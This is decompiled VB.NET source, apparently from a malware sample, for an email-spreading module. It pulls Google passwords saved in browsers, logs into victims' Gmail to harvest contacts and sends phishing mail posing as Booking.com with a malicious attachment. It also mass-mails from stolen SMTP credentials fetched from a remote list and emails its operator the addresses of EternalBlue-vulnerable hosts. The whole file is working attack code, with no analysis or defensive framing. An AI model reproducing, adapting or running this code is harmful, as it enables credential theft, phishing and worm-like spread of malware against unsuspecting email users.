Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports System.Xml
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x02000045 RID: 69
	Friend Class Email
		' Token: 0x0600017A RID: 378 RVA: 0x0000CE48 File Offset: 0x0000B048
		Public Shared Sub DownloadFile(url As Uri, filename As String)
			Try
				Using webClient As WebClient = New WebClient()
					webClient.DownloadFile(url + Config.SpreadMailEmailListFile, filename)
				End Using
			Catch
			End Try
		End Sub

		' Token: 0x0600017B RID: 379 RVA: 0x0000CE9C File Offset: 0x0000B09C
		Public Shared Function GetAllMails(Optional username As String = "", Optional password As String = "") As List(Of Mail)
			Dim webClient As WebClient = New WebClient()
			Dim xmlDocument As XmlDocument = New XmlDocument()
			Try
				webClient.Credentials = New NetworkCredential(username, password)
				Dim text As String = Encoding.UTF8.GetString(webClient.DownloadData("https://mail.google.com/mail/feed/atom"))
				text = text.Replace("<feed version=""0.3"" xmlns=""http://purl.org/atom/ns#"">", "<feed>")
				xmlDocument.LoadXml(text)
				For Each obj As Object In xmlDocument.SelectNodes("feed/entry")
					Dim xmlNode As XmlNode = CType(obj, XmlNode)
					Dim mail As Mail = New Mail()
					Dim xmlNode2 As XmlNode = xmlNode.SelectSingleNode("author/email")
					mail.From = If((xmlNode2 IsNot Nothing), xmlNode2.InnerText, Nothing)
					Dim xmlNode3 As XmlNode = xmlNode.SelectSingleNode("title")
					mail.Title = If((xmlNode3 IsNot Nothing), xmlNode3.InnerText, Nothing)
					Dim xmlNode4 As XmlNode = xmlNode.SelectSingleNode("summary")
					mail.Summary = If((xmlNode4 IsNot Nothing), xmlNode4.InnerText, Nothing)
					Dim mail2 As Mail = mail
					Email.Mails.Add(mail2)
				Next
				Return Email.Mails
			Catch
			End Try
			Return Nothing
		End Function

		' Token: 0x0600017C RID: 380 RVA: 0x0000CFCC File Offset: 0x0000B1CC
		Public Shared Sub EmailSpreading()
			Try
				Dim passwords As List(Of PassData) = Browsers.GetPasswords()
				For Each passData As PassData In passwords
					If passData.Url.Contains("accounts.google.com/signin") OrElse passData.Url.Contains("accounts.google.com/SignUp") Then
						Email.SpreadMails = Email.GetAllMails(passData.Login, passData.Password)
						Email.SendEmail(passData.Login, passData.Password, Email.SpreadMails)
					End If
				Next
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600017D RID: 381 RVA: 0x0000D084 File Offset: 0x0000B284
		Public Shared Sub SendEmail(username As String, password As String, recipients As List(Of Mail))
			Try
				Dim mailMessage As MailMessage = New MailMessage()
				Dim smtpClient As SmtpClient = New SmtpClient("smtp.gmail.com")
				mailMessage.From = If((Not username.Contains("@gmail.com")), New MailAddress(username + "@gmail.com", "Booking.com"), New MailAddress(username, "Booking.com"))
				For Each mail As Mail In recipients
					Dim text As String = Regex.Split(mail.From, "@")(0)
					If Not text.ToLower().Contains("reply") AndAlso Not text.ToLower().Contains("subscribe") AndAlso Not text.ToLower().Contains("mail") AndAlso Not text.ToLower().Contains("newsletter") AndAlso Not text.ToLower().Contains("info") AndAlso Not text.ToLower().Contains("support") AndAlso Not text.ToLower().Contains("support") Then
						mailMessage.[To].Add(mail.From)
					End If
				Next
				If Not File.Exists(Environment.CurrentDirectory + "\registration.jpg") Then
					File.WriteAllBytes(Environment.CurrentDirectory + "\registration.jpg", Resources.registration1)
					File.SetAttributes(Environment.CurrentDirectory + "\registration.jpg", FileAttributes.Hidden)
				End If
				mailMessage.Subject = Email.MailSubject
				Dim text2 As String = Environment.CurrentDirectory + "\registration.jpg"
				Dim attachment As Attachment = New Attachment(text2)
				attachment.ContentDisposition.Inline = True
				attachment.ContentDisposition.DispositionType = "inline"
				mailMessage.IsBodyHtml = True
				mailMessage.Body = "<img src=""cid:Screenshot"" alt="""" />"
				attachment.ContentId = "Screenshot"
				attachment.ContentType.MediaType = "image/jpg"
				attachment.ContentType.Name = Path.GetFileName(text2)
				mailMessage.Attachments.Add(attachment)
				Dim attachment2 As Attachment = New Attachment(Application.StartupPath + "\" + Config.SpreadEmailAttachment)
				mailMessage.Attachments.Add(attachment2)
				smtpClient.Port = Config.SmtpServerData.ServerPort
				smtpClient.Credentials = New NetworkCredential(Regex.Split(username, "@")(0), password)
				smtpClient.EnableSsl = Config.SmtpServerData.SslEnable
				smtpClient.Send(mailMessage)
			Catch
			End Try
		End Sub

		' Token: 0x0600017E RID: 382 RVA: 0x0000D324 File Offset: 0x0000B524
		Public Sub MassMailer()
			Try
				If(Path.GetDirectoryName(Application.ExecutablePath) = Path.GetDirectoryName(Config.FinalExePath) OrElse Path.GetDirectoryName(Application.ExecutablePath) = Path.GetDirectoryName(Config.TempExePath)) AndAlso Not File.Exists(Config.smtpListListFile) Then
					File.WriteAllText(Config.smtpListListFile, Resources.smtp)
				End If
				For Each text As String In File.ReadAllLines(Config.smtpListListFile)
					Try
						Email.SmtpServerData.Ip = Regex.Split(text, ":")(0)
						Email.SmtpServerData.Port = Regex.Split(text, ":")(1)
						Email.SmtpServerData.Email = Regex.Split(text, ":")(2)
						Email.SmtpServerData.Username = Regex.Split(Email.SmtpServerData.Email, "@")(0)
						Email.SmtpServerData.Password = Regex.Split(text, ":")(3)
						If(Path.GetDirectoryName(Application.ExecutablePath) = Path.GetDirectoryName(Config.FinalExePath) OrElse Path.GetDirectoryName(Application.ExecutablePath) = Path.GetDirectoryName(Config.TempExePath)) AndAlso Not File.Exists(Config.SpreadMailEmailListFile) Then
							Email.DownloadFile(Config.SpreadMailWebServerAddress, Config.SpreadMailEmailListFile)
						End If
						For Each text2 As String In File.ReadAllLines(Config.SpreadMailEmailListFile)
							Email.EmailData.Email = Regex.Split(text2, ":")(0)
							Email.EmailData.Username = Regex.Split(Email.EmailData.Email, "@")(0)
							Email.EmailData.Password = Regex.Split(text2, ":")(1)
							Dim mailMessage As MailMessage = New MailMessage()
							mailMessage.[To].Add(Email.EmailData.Email)
							Dim smtpClient As SmtpClient = New SmtpClient(Email.SmtpServerData.Ip)
							mailMessage.From = New MailAddress(Email.SmtpServerData.Email, "Booking.com")
							mailMessage.Subject = Email.MailSubject
							If Not File.Exists(Environment.CurrentDirectory + "\registration.jpg") Then
								File.WriteAllBytes(Environment.CurrentDirectory + "\registration.jpg", Resources.registration1)
							End If
							Dim text3 As String = Environment.CurrentDirectory + "\registration.jpg"
							Dim attachment As Attachment = New Attachment(text3)
							attachment.ContentDisposition.Inline = True
							attachment.ContentDisposition.DispositionType = "inline"
							mailMessage.IsBodyHtml = True
							mailMessage.Body = "<img src=""cid:Screenshot"" alt="""" />"
							attachment.ContentId = "Screenshot"
							attachment.ContentType.MediaType = "image/jpg"
							attachment.ContentType.Name = Path.GetFileName(text3)
							mailMessage.Attachments.Add(attachment)
							Dim attachment2 As Attachment = New Attachment(Application.StartupPath + "\" + Config.SpreadEmailAttachment)
							mailMessage.Attachments.Add(attachment2)
							smtpClient.Port = Integer.Parse(Email.SmtpServerData.Port)
							smtpClient.Credentials = New NetworkCredential(Email.SmtpServerData.Username, Email.SmtpServerData.Password)
							smtpClient.EnableSsl = Config.SmtpServerData.SslEnable
							smtpClient.Send(mailMessage)
							Thread.Sleep(1800000)
						Next
					Catch ex As Exception
					End Try
				Next
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x0600017F RID: 383 RVA: 0x0000D680 File Offset: 0x0000B880
		Public Sub EternalBlueEmail(target As String)
			Try
				Dim mailMessage As MailMessage = New MailMessage()
				Dim smtpClient As SmtpClient = New SmtpClient(Config.SmtpServerData.ServerLinkAddress)
				mailMessage.From = New MailAddress(Config.SmtpServerData.SelectedMailFrom)
				mailMessage.[To].Add(Config.SmtpServerData.SelectedMailTo)
				mailMessage.Subject = "EternalBlue Vulnerable Target"
				mailMessage.Body = vbLf & vbLf & "Vulnerable IP Address: " + target
				smtpClient.Port = Config.SmtpServerData.ServerPort
				smtpClient.Credentials = New NetworkCredential(Config.SmtpServerData.SelectedUsername, Config.SmtpServerData.SelectedPassword)
				smtpClient.EnableSsl = Config.SmtpServerData.SslEnable
				smtpClient.Send(mailMessage)
			Catch
			End Try
		End Sub

		' Token: 0x04000130 RID: 304
		Public Shared Mails As List(Of Mail) = New List(Of Mail)()

		' Token: 0x04000131 RID: 305
		Public Shared SpreadMails As List(Of Mail) = New List(Of Mail)()

		' Token: 0x04000132 RID: 306
		Public Shared MailSubject As String = "Failed Transaction #1504"

		' Token: 0x04000133 RID: 307
		Public Shared MailBody As String = String.Concat(New String() { vbLf & vbLf & "We regret to inform you that your order #1504 could not be shipped because some of your delivery address data is missing,", Environment.NewLine, "please use our registration form utility to complete all required information and we will gladly send your items.", Environment.NewLine, Environment.NewLine, "Password for the registration form archive is: 1504", Environment.NewLine, Environment.NewLine, "Best Regards,", Environment.NewLine, "Vincent Conrad.", Environment.NewLine, "Division Manager." })

		' Token: 0x02000046 RID: 70
		Public NotInheritable Class SmtpServerData
			' Token: 0x04000134 RID: 308
			Public Shared Ip As String

			' Token: 0x04000135 RID: 309
			Public Shared Port As String

			' Token: 0x04000136 RID: 310
			Public Shared Email As String

			' Token: 0x04000137 RID: 311
			Public Shared Username As String

			' Token: 0x04000138 RID: 312
			Public Shared Password As String
		End Class

		' Token: 0x02000047 RID: 71
		Private NotInheritable Class EmailData
			' Token: 0x04000139 RID: 313
			Public Shared Email As String

			' Token: 0x0400013A RID: 314
			Public Shared Username As String

			' Token: 0x0400013B RID: 315
			Public Shared Password As String
		End Class
	End Class
End Namespace
